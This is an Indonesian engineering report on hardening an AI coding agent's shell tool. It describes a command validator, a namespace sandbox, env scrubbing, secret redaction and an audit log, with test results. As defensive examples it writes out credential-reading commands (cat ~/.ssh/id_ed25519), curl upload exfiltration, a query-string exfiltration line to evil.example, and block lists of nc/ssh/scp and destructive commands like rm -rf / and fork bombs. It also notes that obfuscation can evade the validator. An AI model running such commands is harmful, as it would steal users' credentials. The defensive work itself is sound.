# Universal Agent Runtime — Fase 8: Security Hardening

Status: **SELESAI** (2026-11-10). Tes: `npx tsc` bersih, `npm test` 401/401
(342 lama + 59 baru), `test/agent-pty.sh` 32/32, `test/tui-pty.sh` 270/270. Belum commit/publish — menunggu perintah Reza.
Fase 9 TIDAK dimulai sebelum perintahnya.

Fase 8 menutup temuan keamanan shell yang TERBUKA sejak Fase 2: sandbox
`run_terminal_command` hanya membatasi working directory awal, isi
perintah tidak divalidasi, dan aturan prompt di `prompt.ts` hanya
instruksi ke model, bukan enforcement. Fase ini memperbaiki ENFORCEMENT
di runtime — bukan menambah instruksi keamanan ke system prompt. Semua
yang dibangun duduk DI ATAS kontrak Fase 2–7: tidak ada komponen lama
yang dibangun ulang, tidak ada perubahan mode CLI, tampilan TUI, format
history, routing fallback, atau workflow interaksi.

**Yang TIDAK ada di Fase 8 (keputusan eksplisit Reza):** confirmation
gate, Ask, YOLO, dan `--yolo` TIDAK ditambahkan — perintah Fase 8 Reza
("Jangan menambahkan Ask, YOLO, --yolo, atau confirmation workflow
baru") mengecualikannya. Gate tetap item TERBUKA dari keputusan Reza
2026-11-10 (decision 1), bukan sesuatu yang diselesaikan atau
dibatalkan Fase 8. Metadata `confirmationPolicy` di registry tetap
menjadi hook-nya bila ia memerintahkannya di fase lain. Lihat §9.3.

## 0. Ringkasan perubahan

| Area | Yang dibangun |
|---|---|
| Shell security | Modul baru `src/agent/security.ts` (`validateShellCommand`, `resolveInsideSecure`, `scrubShellEnv`, redactor) + modul baru `src/agent/shell-sandbox.ts` (namespace sandbox `unshare`, mask + verifikasi, fallback jujur) |
| Secret protection | `createRedactor` / `collectSessionSecrets` (nilai eksak + pola generik); redaksi di orchestrator (semua output tool), loop (streaming, history, finalText, error), handler shell (stdout/stderr/command), ChatApp (tampilan, thinking, error, /compact) |
| Permission enforcement | Mode toolset sebagai boundary permission (diuji: Plan mode menolak semua mutating tool); shell validator + sandbox + env scrub sebagai lapisan kedua; metadata confirmation TIDAK diubah perilakunya |
| Audit log | Modul baru `src/agent/audit-log.ts`: JSONL append-only `<configDir>/audit.log` (mode 0600, rotasi 5 MB), entri per processed call dengan argumen tersanitasi + teredaksi; diaktifkan loop untuk turn agen nyata |
| Loop | `loop.ts`: redactor per turn, `audit`/`auditLogPath` di `AgentLoopOptions`, redaksi event/history/finalText/error, header kontrak Fase 8 |
| TUI | `ChatApp.tsx`: redactor dari apiKey, pass redaksi whole-message di `finally` send(), redaksi error + ringkasan /compact, `audit: true` di `runAgentLoop` |
| Registry/orchestrator | Komentar gate diperbarui (Fase 8 TIDAK mengimplementasikan gate); orchestrator: `redact`/`audit`/`auditLogPath` di context, redaksi output, field `sandbox` di hasil |
| Tes | `test/security.test.mjs` (59 tes baru, semua dengan DUMMY credentials) |

## 1. Temuan keamanan SEBELUM dan SESUDAH

### 1.1 Shell execution (temuan Fase 2 §4 — TERBUKA sejak Fase 2)

SEBELUM:

- `run_terminal_command` memanggil `spawn("bash", ["-c", command])`
  tanpa validasi isi perintah. Model bisa menjalankan
  `cat ~/.config/metatech/credentials.json`,
  `cat ~/.ssh/id_ed25519`, `cat .env`, `env`, atau eksfiltrasi via
  `curl --data-binary @file https://...` — dan hasilnya kembali ke
  model sebagai tool output biasa.
- Sandbox file tools (`resolveInside` di `tools.ts`) murni leksikal:
  tidak ada resolusi symlink. Symlink di dalam workspace yang
  menunjuk ke luar (mis. `link.json -> ~/.config/metatech/
  credentials.json`) LOLOS dan file di luar bisa dibaca/ditulis.
- Shell child mewarisi SELURUH environment proses induk, termasuk
  `METATECH_API_KEY` bila diset di env — `printenv` model bisa
  membuangnya.
- Aturan prompt `prompt.ts` ("Stay inside the project folder...")
  hanya instruksi ke model, BUKAN enforcement.
- Tidak ada redaksi secret di output tool, error, streaming, atau
  log. Tidak ada audit log eksekusi tool.

SESUDAH (enforcement yang benar-benar diterapkan):

1. **Validasi perintah (lapisan 1)** — `validateShellCommand`
   memeriksa string perintah SEBELUM dijalankan: referensi path
   sensitif (absolut + token path di luar workspace yang menunjuk
   file kredensial), primitif eksfiltrasi (curl/wget dengan flag
   upload, pipe ke shell, nc/ssh/scp/rsync/sudo/eval, inline code
   yang mengirim data), primitif destruktif (`rm -rf /`, `rm -rf
   $HOME`, `mkfs`, `dd ... of=/dev/`, fork bomb, `chmod -R ... /`).
   Pemisah segmen sadar quote, jadi `;` di dalam string `-c "..."`
   tidak memecah perintah. Penolakan adalah tool error `ok:false`
   dengan alasan — model melihat apa yang diblokir dan mengapa.
2. **Namespace sandbox (lapisan 2)** — di Linux dengan user
   namespace, perintah berjalan di `unshare --user
   --map-root-user --mount` dengan direktori kredensial
   (`~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.kube`, `~/.docker`,
   `~/.config`, config dir CLI) di-bind-mount dengan direktori
   kosong, dan file kredensial (`~/.npmrc`, `~/.netrc`,
   `~/.git-credentials`, `~/.env`) dengan `/dev/null`. Masking
   DIVERIFIKASI di dalam namespace: direktori kredensial yang
   masih berisi setelah masking menggagalkan perintah (exit 126),
   bukan jalan tanpa proteksi.
3. **Env scrub (lapisan 3)** — shell child hanya menerima allowlist
   kecil (PATH, HOME, USER, LANG, TERM, dsb.); semua `*_KEY`,
   `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `METATECH_*`, dan nilai
   opaque panjang dibuang.
4. **Containment realpath** — semua file tool memakai
   `resolveInsideSecure`: `resolveInside` leksikal + realpath
   (ancestor terdekat bila target belum ada) + keharusan path real
   tetap di dalam root workspace. Symlink yang menunjuk keluar
   ditolak di read/list/search/str_replace/write_file DAN di `cwd`
   shell.
5. **Secret redaction** — redactor nilai eksak (API key sesi +
   env var rahasia) + pola generik (`sk-...`, `sk-ant-...`,
   `npm_...`, token GitHub, `AKIA...`, `xox...`, `Bearer ...`,
   `api_key=...`, blok private key) diterapkan di orchestrator
   (semua output tool), loop (event streaming, history, finalText,
   error), handler shell, dan tampilan ChatApp.
6. **Audit log** — setiap processed call tercatat (tool, waktu,
   ok/gagal, durasi, failureKind, mode sandbox, argumen
   tersanitasi + teredaksi). Tidak ada isi file, tidak ada output
   penuh, tidak ada nilai secret. Satu entri = satu baris JSON
   (argumen yang mengandung newline tidak bisa menempa baris
   kedua).

Dampak Fase 8 terhadap risiko shell: temuan Fase 2 §4 DITUTUP oleh
lapisan 1–6 di atas — dengan keterbatasan yang didokumentasikan
jujur di §9 (validator sintaktis bisa diakali obfuscation;
sandbox namespace hanya di Linux; egress jaringan tidak diblokir
penuh; tidak ada confirmation gate).

### 1.2 Secret leakage — SEBELUM vs SESUDAH

| Jalur | Sebelum | Sesudah |
|---|---|---|
| Tool output (file dibaca model) | mentah ke model | diredaksi orchestrator (whole text) |
| Shell stdout/stderr | mentah | diredaksi handler + orchestrator |
| Streaming text/reasoning | mentah ke layar | diredaksi per delta (best effort) + whole-message di loop & ChatApp |
| History (pesan assistant) | mentah tersimpan | diredaksi utuh sebelum disimpan |
| Error provider / tool | mentah | diredaksi (loop + ChatApp setError) |
| Audit log | tidak ada | ringkasan tersanitasi + teredaksi, tanpa isi file |
| Env shell child | penuh diwariskan | scrub allowlist |
| /compact summary | mentah ditampilkan | diredaksi sebelum tampil |

## 2. Shell Execution Security

### 2.1 Validator (`src/agent/security.ts`, `validateShellCommand`)

Urutan pemeriksaan: (1) prefix absolut sensitif di seluruh string
(menangkap command substitution, pipe, `python -c`, `node -e`);
(2) token path yang resolve ke luar workspace DAN menunjuk file
kredensial (basename check) — file `.env` / `credentials.json`
milik proyek DI DALAM workspace tetap diizinkan; (3) primitif
eksfiltrasi per segmen (first token: nc/ncat/socat/ssh/scp/sftp/
rsync/ftp/telnet/sudo/su/doas/eval; curl/wget dengan flag upload;
inline code dengan network send; pipe ke shell); (4) primitif
destruktif. Nama perintah saja TIDAK PERNAH menjadi satu-satunya
alasan penolakan — yang diperiksa adalah apa yang dilakukan
perintah terhadap data apa.

### 2.2 Namespace sandbox (`src/agent/shell-sandbox.ts`)

- `isSandboxAvailable()`: probe sekali per proses
  (`unshare --user --map-root-user --mount /bin/true`).
  Terverifikasi di VM Muse: user namespace jalan,
  `/proc/sys/kernel/unprivileged_userns_clone = 1`.
- `runShellCommand(command, {cwd, env, timeoutSeconds})`:
  bila tersedia, spawn `unshare` + mask script (ditulis sekali per
  proses ke tmpdir, mode 0600); bila tidak, spawn `bash -c`
  langsung. Mengembalikan `sandbox: "namespace" |
  "validation-only"` — mode yang BENAR-BENAR dipakai, dilaporkan
  ke model (field `sandbox` di JSON hasil shell) dan ke audit log.
- Timeout sama seperti sebelumnya (SIGTERM lalu SIGKILL 1500 ms);
  di jalur namespace, sinyal dikirim ke seluruh process group
  (rantai unshare → sh → bash).
- Mask script memverifikasi dua direktori kritis (`.ssh` dan
  config dir CLI): bila masih berisi setelah masking, exit 126 —
  fail closed, bukan jalan tanpa proteksi.

### 2.3 Env scrub (`scrubShellEnv`)

Allowlist: PATH, HOME, USER, LOGNAME, LANG, LC_ALL, LC_CTYPE,
TERM, COLORTERM, SHELL, PWD, OLDPWD, TMPDIR, TZ, NODE_OPTIONS,
NPM_CONFIG_CACHE, FORCE_COLOR, NO_COLOR, CI. Selain itu: semua
nama yang berakhiran `_KEY`/`_TOKEN`/`_SECRET`/`_PASSWORD`/
`_PASSWD`/`_AUTH`/`_CREDENTIAL`/`_PRIVATE`/`BEARER`/`SESSION`/
`COOKIE`/`API_KEY` dibuang; semua `METATECH_*` dibuang; nilai
opaque 40+ karakter di bawah prefix `NPM_`/`NODE_`/`GIT_` dibuang.

### 2.4 Containment realpath (`resolveInsideSecure`)

`resolveInside` (leksikal, dipertahankan sebagai helper + untuk
kompatibilitas test) + `realpathAllowMissing` (resolve ancestor
terdekat bila target belum ada, jadi parent yang berupa symlink
keluar tetap tertangkap) + keharusan path real di dalam root
workspace yang juga di-realpath. Diterapkan di keenam call site
file/shell tool. `walkFiles` (glob/code_search) tidak mengikuti
symlink sama sekali (`Dirent.isDirectory()`/`isFile()` false
untuk symlink), jadi enumerasi nama file di luar workspace tidak
bocor lewat glob.

## 3. Secret Protection

`createRedactor(secrets)`: nilai eksak (panjang ≥ 8, terpanjang
dulu) + pola generik (lihat §1.2). `collectSessionSecrets(apiKey)`:
API key sesi + env var yang namanya tampak rahasia. Redactor
tidak pernah membaca file kredensial — hanya meredaksi nilai yang
sudah dipegang runtime di memori. Redaksi bersifat idempotent.

Titik penerapan (semua whole-text kecuali event streaming
per-delta): orchestrator `normalizeResult`/`errorResult` (SEBELUM
cap, agar secret tidak selamat di ekor hasil yang terpotong);
handler `run_terminal_command` (command + stdout + stderr);
loop (event text/reasoning, pesan assistant yang disimpan,
finalText, pesan error model call); ChatApp (pass redaksi
whole-message di `finally` send(), thinking, error, ringkasan
/compact). Secret yang terbelah di dua delta stream ditangkap
oleh pass whole-message di loop dan ChatApp — didokumentasikan
sebagai best-effort di level delta, bukan klaim sempurna.

## 4. Permission Enforcement

- **Boundary permission = mode toolset** (tidak berubah dari
  Fase 3–4, kini ditegaskan sebagai enforcement point di
  `executeOne`): Plan mode mengecualikan SEMUA mutating tool
  (`run_terminal_command`, `write_file`, `str_replace`); orchestrator
  menolaknya dengan `failureKind: "validation"` dan mencatat
  penolakan di audit log. Diuji di `test/security.test.mjs`.
- **Lapisan kedua untuk shell**: validator + namespace sandbox +
  env scrub (lihat §2) — berlaku untuk SEMUA mode yang
  mengizinkan shell, bukan hanya Plan.
- **Metadata confirmation TIDAK diubah**: `confirmationPolicy`,
  `requiresConfirmation`, `confirmationNote` di registry tetap
  seperti Fase 2/3 (metadata saja). Komentar yang dulu menyebut
  "gate Fase 8" diperbarui agar tidak mengklaim gate
  diimplementasikan — lihat §9.3.
- Tidak ada Ask/YOLO/`--yolo`/workflow konfirmasi baru. Tidak ada
  perubahan mode CLI atau interaksi pengguna.

## 5. Audit Log

`src/agent/audit-log.ts`: `auditLogPath()` =
`<configDir>/audit.log` (default `~/.config/metatech/audit.log`,
bisa di-override `METATECH_CONFIG_DIR`). Satu entri per processed
call: `{ts, session, tool, ok, durationMs, failureKind?,
sandbox?, args}`. `session` = UUID acak per proses (korelasi satu
sesi CLI tanpa mencatat apa pun tentang user). `args` =
`summarizeToolArgs` — untuk shell: teks perintah terpotong 400
karakter (teredaksi); untuk write/str_replace: path + jumlah byte
(TIDAK PERNAH isi konten); untuk yang lain: JSON input terpotong
(teredaksi). Rotasi di 5 MB (`.log.1`, satu generasi). File mode
0600. `appendAuditLog` tidak pernah throw — kegagalan logging
tidak mematahkan turn agen.

Diaktifkan oleh loop (`AgentLoopOptions.audit`, default false —
unit test membiarkannya mati agar tidak menulis log nyata user;
ChatApp mengaktifkan `audit: true` untuk turn agen nyata).
Terbukti end-to-end: run `test/agent-pty.sh` menulis 15 entri ke
audit log di config dir temp-nya, dengan session id konsisten dan
argumen tersanitasi.

Anti-manipulasi: entri diserialisasi `JSON.stringify` satu baris
— newline di dalam argumen di-escape, jadi input model yang
dibuat-buat tidak bisa menempa entri kedua (diuji).

## 6. Integrasi arsitektur + file yang berubah

Dipakai ulang tanpa dibangun ulang: Tool Registry Fase 3 (lookup +
validasi schema + klasifikasi), Tool Orchestrator Fase 4 (satu-satunya
jalur eksekusi; redaksi + audit disisipkan di `executeOne` /
`normalizeResult` / `errorResult`), Agent Loop Fase 5 (redactor per
turn + audit flag), Fallback Protocol Fase 6 (tidak berubah), Context
Manager + Streaming Fase 7 (tidak berubah).

| File | Perubahan |
|---|---|
| `src/agent/security.ts` (BARU) | `resolveInsideSecure`, `realpathAllowMissing`, `validateShellCommand` (+ `splitSegments` sadar quote), `scrubShellEnv`, `createRedactor`, `collectSessionSecrets`, daftar lokasi/basename sensitif |
| `src/agent/shell-sandbox.ts` (BARU) | `isSandboxAvailable` (probe cache), `runShellCommand` (unshare + mask script + verifikasi masking + fallback direct), timeout SIGTERM→SIGKILL per process group |
| `src/agent/audit-log.ts` (BARU) | `appendAuditLog`, `auditLogPath`, `summarizeToolArgs`, `AUDIT_SESSION_ID`, rotasi 5 MB, mode 0600 |
| `src/agent/tools.ts` | Import security/sandbox; `ToolContext.redact`; `ToolResult.sandbox`; `resolveInside` → `resolveInsideSecure` di 6 call site; handler shell ditulis ulang (validasi → scrub env → `runShellCommand` → redaksi); `resolveInside` didokumentasikan leksikal-saja |
| `src/agent/tool-orchestrator.ts` | `OrchestratorContext.redact`/`audit`/`auditLogPath`; `OrchestratedToolResult.sandbox`; redaksi di `normalizeResult`/`errorResult`; `auditCall` di semua jalur `executeOne`; header non-goal diperbarui |
| `src/agent/loop.ts` | Redactor per turn; `AgentLoopOptions.audit`/`auditLogPath`; redaksi event/history/finalText/error; header kontrak Fase 8; non-goal gate diperbarui |
| `src/agent/tool-registry.ts` | Komentar gate diperbarui (13 titik): Fase 8 TIDAK mengimplementasikan gate |
| `src/agent/index.ts` | Export `security`, `shell-sandbox`, `audit-log` |
| `src/ui/ChatApp.tsx` | Redactor dari apiKey; `audit: true`; redaksi thinking/error//compact; pass redaksi whole-message di `finally` send() |
| `test/security.test.mjs` (BARU) | 59 tes keamanan (lihat §7) |
| `docs/UNIVERSAL-RUNTIME-PHASE8.md` (BARU) | Dokumen ini |
| `docs/UNIVERSAL-RUNTIME-AUDIT.md` | Baris roadmap Fase 8 → SELESAI; bagian Fase 8 → ringkasan selesai; catatan koreksi §11 decision 1 (gate dikecualikan) |
| `.bak-20261110-security/` | Backup 7 file sebelum edit (tools, loop, orchestrator, registry, index, ChatApp, audit doc) |

Tidak diubah: `model-adapter.ts`, `model-capabilities.ts`,
`fallback-protocol.ts`, `context-manager.ts`, `xml-parser.ts`,
`modes.ts`, `prompt.ts` (aturan prompt TIDAK diubah — enforcement
kini ada di kode, prompt tetap sebagai instruksi tambahan),
panel/production (tidak disentuh sama sekali).

## 7. Hasil pengujian keamanan (wajib)

Semua tes memakai DUMMY credentials (nilai acak per run, prefix
`sk-dummy-`/`dummy-token-`); tidak ada kredensial production yang
dibaca atau ditulis. Fake home + workspace di `os.tmpdir()`,
dihapus tiap tes. File: `test/security.test.mjs`, 59 tes, semua
hijau (bagian dari `npm test` 401/401).

| # | Pengujian | Hasil |
|---|---|---|
| 1 | Baca `.env` di luar workspace (shell) | DIBLOKIR validator (`references a credential location`) |
| 2 | Baca `credentials.json` (symlink + shell) | DITOLAK `resolveInsideSecure` (read_files) + DIBLOKIR validator (shell) |
| 3 | Baca SSH keys (symlink dir + shell) | DITOLAK (list_directory) + DIBLOKIR (shell) |
| 4 | Path traversal (`../`) | DITOLAK |
| 5 | Symlink menuju file sensitif (read/write/str_replace) | DITOLAK; write tidak menulis apa pun ke luar |
| 6 | Command chaining (`ls; cat ~/.ssh/...`) | DIBLOKIR (segmen kedua) |
| 7 | Shell substitution (`$(cat ~/.config/...)`) | DIBLOKIR (whole-string check) |
| 8 | Subprocess / child process (python socket, node fetch POST) | DIBLOKIR (inline-code network send) |
| 9 | Kirim data sensitif via curl/wget (upload flags, pipe ke shell) | DIBLOKIR (`--data*`, `--post-data`, `\| sh`, `\| bash`) |
| 10 | Kebocoran secret via stdout (shell echo) | TEREDAKSI `[REDACTED]` |
| 11 | Kebocoran secret via stderr / error | TEREDAKSI (loop + ChatApp setError) |
| 12 | Kebocoran secret via streaming (termasuk secret terbelah 2 delta) | TEREDAKSI (event per delta + whole-message) |
| 13 | Kebocoran secret via audit log | TIDAK ADA (ringkasan teredaksi; isi file tidak pernah dicatat) |
| 14 | Manipulasi permission (Plan mode + tool mutating) | DITOLAK orchestrator (`failureKind: validation`); penolakan TERAUDIT |
| 15 | Eksekusi tool tanpa otorisasi (mode) | DITOLAK (mode toolset boundary) |
| 16 | Operasi normal yang diizinkan tetap berfungsi | BERFUNGSI (read/write di workspace, `ls`, `npm test`, `git status`, `curl` GET, `cat .env` proyek, `echo 'a;b \| c'`) |
| 17 | Namespace sandbox: `cat` kredensial di dalam namespace | GAGAL (file tidak ada — direktori ter-mask), `ls ~/.ssh` kosong, file workspace tetap terbaca |
| 18 | Env scrub: `printenv METATECH_API_KEY` | KOSONG (key tidak diwariskan) |
| 19 | Audit log anti-forgery (argumen berisi newline) | SATU BARIS per entri (tidak bisa menempa entri kedua) |
| 20 | Loop: secret di tool result dalam history | TEREDAKSI; call TERAUDIT |

Dua kegagalan awal selama pengembangan (diperbaiki sebelum
selesai): (1) `wget --post-data` lolos karena `--post-data`
belum ada di daftar upload flag — ditambahkan (`--post-data`,
`--post-file`); (2) ekspektasi test `FOO_BAR` salah — scrub
memang allowlist ketat, variabel tak dikenal dibuang (test
diperbaiki, bukan kodenya). Keduanya tercatat jujur, bukan
disembunyikan.

## 8. Kompatibilitas + hasil test suite

- `npx tsc`: bersih.
- `npm test`: 401/401 (342 lama + 59 baru). Tidak ada test lama
  yang diubah ekspektasinya — Fase 8 tidak mengubah perilaku
  runtime yang sudah diuji, kecuali penolakan perintah yang
  sebelumnya lolos (itu memang tujuannya).
- `test/agent-pty.sh`: 32/32.
- `test/tui-pty.sh`: 270/270.
- History format Fase 5: TIDAK berubah, kecuali nilai secret
  yang diredaksi di dalam pesan assistant/tool (format `{tool,
  ok, output}` + id sintetis sama).
- Ledger Fase 5, routing fallback Fase 6, context/streaming
  Fase 7: tidak berubah. Tidak ada perubahan mode CLI, TUI,
  atau workflow interaksi. Tidak ada tool yang dihapus.

## 9. Keterbatasan keamanan yang MASIH tersisa (jujur)

1. **Validator sintaktis bisa diakali.** `validateShellCommand`
   memeriksa string perintah. Model yang meng-obfuscate path
   (`$'~/.ssh'`, konstruksi string dinamis, decode base64 ke file
   lalu mengeksekusinya) dapat lolos dari validator. Lapisan
   namespace (masking direktori) menutup sebagian besar celah ini
   di Linux — tapi lihat butir 2.
2. **Namespace sandbox hanya Linux.** Termux, macOS, dan Windows
   tidak menyediakan user namespace; di sana mode jatuh ke
   `"validation-only"` (validator + env scrub saja) dan itu
   DILAPORKAN apa adanya di hasil tool + audit log — tidak pernah
   diklaim sebagai namespace. Di Termux khususnya, isolasi
   filesystem yang kuat TIDAK tersedia dari CLI ini; kredensial
   di `~/.config/metatech` tetap mengandalkan validator +
   redaksi + disiplin model.
3. **Network egress tidak diblokir penuh.** Validator memblokir
   primitif upload (curl/wget data, pipe ke shell, nc/ssh/scp,
   inline code network send) — tetapi `curl https://...` GET
   polos DIIZINKAN (diperlukan untuk pekerjaan normal: cek
   endpoint, unduh dependency). GET polos masih bisa dipakai
   untuk eksfiltrasi lewat URL query
   (`curl "https://evil.example/$(cat file)"`) bila file-nya
   bisa dibaca — dan pembacaan file kredensial itulah yang
   diblokir lapisan 1–2. Tidak ada network namespace: memblokir
   egress penuh akan mematikan `npm install` dan pekerjaan
   normal lainnya. Ini trade-off sadar, bukan kelalaian.
4. **Tidak ada confirmation gate.** Perintah destruktif yang
   LOLOS validator (mis. `rm -rf ./build` di dalam workspace —
   legal menurut policy) tetap jalan tanpa konfirmasi. Risiko
   ini diterima Reza saat menolak gate di 0.1.6 dan saat
   mengecualikan gate dari Fase 8. Mitigasinya hanya audit log
   (jejak) + validator (blokir pola destruktif absolut) — bukan
   persetujuan interaktif.
5. **TOCTOU pada symlink.** Containment di-check saat handler
   berjalan; pergantian symlink antara check dan read secara
   teori mungkin — tetapi model hanya bisa menulis lewat tool
   yang sama-sama ter-check, jadi jalur eksploitasi ini butuh
   aktor di luar agen.
6. **Redaksi berbasis pola tidak sempurna.** Pola generik
   menangkap format kredensial yang dikenal; format baru/tidak
   dikenal yang tidak pernah dilihat sebagai nilai eksak bisa
   lolos redaksi pola (tetapi nilai API key SESI selalu
   teredaksi karena dikenal eksak).
7. **Unit test bukan bukti sandbox aman.** Tes namespace di
   `test/security.test.mjs` membuktikan mekanisme masking jalan
   di VM ini (direktori ter-mask, file tidak terbaca). Itu BUKAN
   audit keamanan formal dan BUKAN bukti ketahanan terhadap
   adversary yang berdedikasi (container escape, kernel exploit,
   dan sejenisnya di luar cakupan).
8. **Skill loading dari home dir.** Skill dimuat dari direktori
   skill user (by design — skill milik user sendiri). Skill
   berbahaya yang user pasang sendiri tetap bisa dibaca model;
   itu kepercayaan pada skill user, bukan celah tool.
9. **Audit log lokal, bukan tamper-proof.** Log ada di disk
   yang sama dengan CLI; user root bisa mengubahnya. Ini log
   akuntabilitas operasional, bukan bukti forensik.

## 10. Kesiapan Fase 9

Fase 8 SELESAI dan Fase 9 SIAP dimulai atas perintah Reza —
dengan catatan: probe live Fase 9 memakai model yang sama dan
jalur tool yang sama, jadi lapisan keamanan Fase 8 (validator,
sandbox, redaksi, audit) ikut teruji di sana. Yang TIDAK boleh
dilupakan saat Fase 9: (a) probe live memakai quota/saldo —
butuh izin spend; (b) capability `nativeToolCalling` tetap
UNKNOWN sampai terbukti live (jangan simpulkan dari nama model);
(c) gate tetap item terbuka — bila Reza memerintahkan gate di
fase lain, metadata `confirmationPolicy` sudah siap dipakai.

## 11. Verifikasi yang dijalankan (perintah + hasil)

- `npx tsc` → bersih (0 error).
- `npm test` → 401/401 (342 lama + 59 baru).
- `bash test/agent-pty.sh` → PASS=32 FAIL=0.
- `bash test/tui-pty.sh` → PASS=270 FAIL=0.
- Namespace probe manual: `unshare --user --map-root-user
  --mount` + tmpfs di atas fake `$HOME` → berhasil (sebelum
  implementasi); tes sandbox otomatis di `test/security.test.mjs`
  → hijau.
- Jalur audit produksi: `test/agent-pty.sh` menulis 15 entri ke
  audit log config dir temp-nya (session id konsisten,
  argumen tersanitasi, tanpa secret).
- TIDAK ada commit/push/deploy. TIDAK ada perubahan panel,
  production, atau database production. TIDAK ada restart service
  production. Working tree tetap uncommitted (HEAD masih
  b384284), menunggu perintah Reza.
